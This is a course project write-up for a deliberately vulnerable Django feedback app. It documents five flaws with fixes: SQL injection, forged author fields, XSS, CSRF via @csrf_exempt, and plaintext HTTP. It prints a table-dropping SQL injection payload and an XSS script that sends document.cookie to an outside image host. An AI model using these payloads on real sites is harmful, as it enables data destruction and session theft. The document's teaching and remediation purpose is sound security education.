# cyber-security

## Project 1
LINK: https://github.com/vaartio/cyber-security 
The project uses the Django framework familiar from the course. To launch the site, run:
`python3 manage.py runserver` and go to the site http://127.0.0.1:8000/. To log in, use the same credentials as for the course: `admin:admin`,  `alice:redqueen` and `bob:squarepants`.

FLAW 1: SQL Injection
Log in as Alice or Bob and go to the page http://127.0.0.1:8000/ in your browser and try to add the following feedback:
foobar"'); DROP TABLE Feedback;--

You receive an error that states "no such table: Feedback" because your request has removed the Feedback table. The code uses the executeScript command, which allows you to execute multiple SQL commands at once, even if only one is expected. The application also does not sanitize the input in any way. Untrusted data is concatenated directly into the string used in the SQL command in both the add_feedback and read_feedback functions. The
  
To restore the original state of the database of the application, run:
python3 src/create_feedback_table.py

To resolve this issue, replace the executeScript script with the execute command to prevent multiple commands from being executed. In addition, enter all input data as parameters for the execute function of SQLite’s cursor. This sanitizes input data and prevents SQL injections that do not require multiple commands but use UNION, for instance.

A solution for add_feeback SQL injection issue:
cur.execute("INSERT INTO Feedback (author, content) VALUES (:author, :feedback)", { 'author': author, 'feedback': feedback })

A solution for read_feedback SQL injection issue:
cur.execute("SELECT author, content FROM Feedback WHERE author=:author ORDER BY id", { 'author': author })

FLAW 2: Broken Access Control
Log in as Alice and go to the page http://127.0.0.1:8000/ in your browser. Now modify your DOM by browser’s developer tools and change the value of the author input element to be “bob”. Now submit some less appropriate feedback, like “admin user sucks!”. Then log in as Bob in another browser and you will see that the application claims that Bob sent feedback. 

To resolve this issue, do not send author information in form post data, because it can be altered by the sender. Use session information for the active user of Django instead. To do this you need to change the source of the author property in the homePageView function.

A solution for homePageView Broken Access Control issue:
author = str(request.user)

FLAW 3: Cross-Site Scripting (XSS)
Log in and go to the page http://127.0.0.1:8000/ and try add the following feedback:
<script>document.write("<img src=\"https://image.shutterstock.com/image-vector/sample-stamp-square-grunge-sign-260nw-1474408826.jpg?"+document.cookie+"\" />");</script>

It adds Javascript to the database and renders the image in the DOM for each user. And most importantly, it adds the current user's cookies to the image source as a URL parameter and sends them to the destination server. If the image source were malicious, cookies could be used to log in to the application and steal your identity.

There are two ways to fix this problem. You can either clean the input before saving it to the database or do it just before rendering it.

Remove autoescape off and endautoescape tags from index.html template to render variables in a safe way:
{% autoescape off %}
{% endautoescape %}

However, it is safer to delete HTML tags as soon as they are received, using the strip_tags function in the views.py file:
from django.utils.html import strip_tags
feedback = strip_tags(feedback)

The existence of both of these ways increases flexibility. And on templates Django is safe by default. The default way for Django's template engine to present variables is safe. You must explicitly tell Django that autoescape will be disabled.

FLAW 4: Broken Authentication
Cross-Site Request Forgery (CSRF) can be considered a broken authentication vulnerability. In CSRF, an attacker does not steal or impersonate another user's session, but tries to get another user (such as an administrator) to execute the request, which causes harm. In many cases, this is done by running Javascript in the victim’s web browser when he or she visits a malicious site. The request is addressed to another site where the victim is an administrator or a privileged user. Such a request could be, for example, to make a purchase on behalf of the user, transfer money or delete content. In this application, an attacker could trigger new feedback when an authenticated user visits a malicious site.

To address CSRF is relatively easy in Django. The CSRF middleware is activated by default and you need to explicitly configure the application to disable CSRF. This happens for example by adding @csrf_exempt before the middleware function. From this point of view CSRF is also a security misconfiguration issue which is another OWASP Top Ten security risk.

To get rid of the risk, delete the @csrf_exempt line above the homePageView function definition in views.py.

FLAW 5: Sensitive Data Exposure
This application works at http://127.0.0.1:8000/. All data is sent unsecured over HTTP. An attacker could determine a user's credentials and session tokens by capturing HTTP traffic with tools such as Wireshark.

This security issue needs to be fixed while the application is running on the Internet. You must use HTTPS and obtain an SSL certificate for your domain.
